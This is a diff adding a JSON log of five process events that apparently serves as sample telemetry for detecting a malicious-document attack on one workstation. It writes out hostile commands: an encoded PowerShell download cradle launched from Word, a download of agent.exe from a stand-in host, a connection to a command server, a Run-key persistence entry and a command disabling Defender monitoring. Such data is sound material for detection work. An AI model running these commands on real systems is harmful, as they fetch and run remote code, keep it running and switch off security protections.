@@ -1,0 +1,38 @@
+[
+  {
+    "timestamp": "2026-08-08T14:03:10Z",
+    "host": "WS-042",
+    "user": "CORP\\analyst",
+    "parent_process": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+    "process": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
+  },
+  {
+    "timestamp": "2026-08-08T14:03:13Z",
+    "host": "WS-042",
+    "user": "CORP\\analyst",
+    "process": "powershell.exe",
+    "command_line": "powershell -c iwr https://updates-example.invalid/agent.exe -OutFile C:\\Users\\analyst\\AppData\\Local\\Temp\\agent.exe"
+  },
+  {
+    "timestamp": "2026-08-08T14:03:19Z",
+    "host": "WS-042",
+    "user": "CORP\\analyst",
+    "process": "agent.exe",
+    "command_line": "C:\\Users\\analyst\\AppData\\Local\\Temp\\agent.exe --server 198.51.100.24"
+  },
+  {
+    "timestamp": "2026-08-08T14:04:02Z",
+    "host": "WS-042",
+    "user": "CORP\\analyst",
+    "process": "reg.exe",
+    "command_line": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d C:\\Users\\analyst\\AppData\\Local\\Temp\\agent.exe"
+  },
+  {
+    "timestamp": "2026-08-08T14:05:44Z",
+    "host": "WS-042",
+    "user": "CORP\\analyst",
+    "process": "powershell.exe",
+    "command_line": "Set-MpPreference -DisableRealtimeMonitoring $true"
+  }
+]
